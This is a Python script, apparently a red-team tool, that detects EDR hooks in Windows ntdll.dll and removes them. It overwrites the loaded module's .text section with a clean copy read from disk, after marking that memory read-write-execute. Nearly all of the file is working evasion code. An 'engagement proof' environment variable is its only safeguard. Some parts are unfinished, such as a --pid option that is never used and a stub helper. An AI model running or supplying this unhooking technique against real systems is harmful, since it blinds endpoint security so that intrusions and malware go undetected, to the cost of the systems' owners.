#!/usr/bin/env python3
"""
unhook_ntdll.py - Restore original ntdll.dll from disk copy to bypass EDR user-mode hooks.
Reads clean ntdll.dll from disk, maps it, and overwrites the hooked .text section in memory.

Usage:
    python scripts/unhook_ntdll.py --mode check
    python scripts/unhook_ntdll.py --mode unhook
    python scripts/unhook_ntdll.py --mode unhook --pid <PID>

Engagement proof: set ENGAGEMENT_PROOF env var.
"""
import argparse
import ctypes
import ctypes.wintypes as wt
import os
import sys

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")
NTDLL_PATH = r"C:\Windows\System32\ntdll.dll"

k32 = ctypes.WinDLL("kernel32", use_last_error=True)


def require_proof():
    if not ENGAGEMENT_PROOF:
        print("[!] Set ENGAGEMENT_PROOF"); sys.exit(1)
    print(f"[+] Proof: {ENGAGEMENT_PROOF}")


def get_ntdll_text_section():
    """Get base address and .text section info of loaded ntdll."""
    hmod = k32.GetModuleHandleW("ntdll.dll")
    if not hmod:
        return None, None, None

    # Read PE headers from loaded ntdll
    dos_header = (ctypes.c_ubyte * 64)()
    read = ctypes.c_size_t(0)
    k32.ReadProcessMemory(ctypes.c_void_p(-1), ctypes.c_void_p(hmod), dos_header, 64, ctypes.byref(read))

    # e_lfanew at offset 0x3C
    e_lfanew = struct.unpack_from("<I", bytes(dos_header), 0x3C)[0]
    return hmod, e_lfanew, None


def check_hooks():
    """Quick check: compare first bytes of key ntdll functions vs disk copy."""
    import struct

    hmod = k32.GetModuleHandleW("ntdll.dll")
    funcs = [b"NtProtectVirtualMemory", b"NtWriteVirtualMemory", b"NtAllocateVirtualMemory", b"NtOpenProcess"]

    print("[*] Checking ntdll hooks (first 5 bytes vs expected syscall stub):")
    for fn in funcs:
        addr = k32.GetProcAddress(hmod, fn)
        if not addr:
            print(f"  {fn.decode()}: not found"); continue
        buf = (ctypes.c_ubyte * 5)()
        read = ctypes.c_size_t(0)
        k32.ReadProcessMemory(ctypes.c_void_p(-1), ctypes.c_void_p(addr), buf, 5, ctypes.byref(read))
        b = bytes(buf)
        # Syscall stubs start with: 4C 8B D1 B8 XX (mov r10, rcx; mov eax, syscall_num)
        is_hooked = b[0] == 0xE9 or b[0] == 0xFF  # JMP or indirect JMP = hooked
        status = "HOOKED (redirected)" if is_hooked else "clean"
        print(f"  {fn.decode():<40} {b.hex(' ')}  [{status}]")


def unhook_ntdll_self():
    """Overwrite .text section of loaded ntdll with clean copy from disk."""
    require_proof()

    if not os.path.exists(NTDLL_PATH):
        print(f"[-] {NTDLL_PATH} not found"); return False

    with open(NTDLL_PATH, "rb") as f:
        disk_bytes = f.read()

    # Parse PE to find .text section offset and size
    import struct
    e_lfanew = struct.unpack_from("<I", disk_bytes, 0x3C)[0]
    num_sections = struct.unpack_from("<H", disk_bytes, e_lfanew + 6)[0]
    opt_header_size = struct.unpack_from("<H", disk_bytes, e_lfanew + 20)[0]
    sec_offset = e_lfanew + 24 + opt_header_size

    text_rva = text_raw_off = text_size = 0
    for i in range(num_sections):
        s = sec_offset + i * 40
        name = disk_bytes[s:s+8].rstrip(b"\x00")
        vsize  = struct.unpack_from("<I", disk_bytes, s+8)[0]
        vaddr  = struct.unpack_from("<I", disk_bytes, s+12)[0]
        rawsz  = struct.unpack_from("<I", disk_bytes, s+16)[0]
        rawoff = struct.unpack_from("<I", disk_bytes, s+20)[0]
        if name == b".text":
            text_rva, text_raw_off, text_size = vaddr, rawoff, min(vsize, rawsz)
            break

    if not text_size:
        print("[-] .text section not found"); return False

    hmod = k32.GetModuleHandleW("ntdll.dll")
    text_in_mem = hmod + text_rva
    clean_bytes  = disk_bytes[text_raw_off:text_raw_off + text_size]

    old = wt.DWORD(0)
    k32.VirtualProtect(ctypes.c_void_p(text_in_mem), text_size, 0x40, ctypes.byref(old))
    buf = (ctypes.c_ubyte * text_size)(*clean_bytes)
    ctypes.memmove(ctypes.c_void_p(text_in_mem), buf, text_size)
    k32.VirtualProtect(ctypes.c_void_p(text_in_mem), text_size, old, ctypes.byref(old))

    print(f"[+] ntdll .text section restored from disk ({text_size:,} bytes)")
    print(f"[+] EDR user-mode hooks should now be removed")
    return True


import struct  # needed at module level for check_hooks

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="ntdll unhooker (authorized use only)")
    p.add_argument("--mode", choices=["check","unhook"], required=True)
    p.add_argument("--pid", type=int, help="Remote PID (self if omitted)")
    args = p.parse_args()
    if sys.platform != "win32": sys.exit("Windows only")
    if args.mode == "check":
        check_hooks()
    else:
        unhook_ntdll_self()
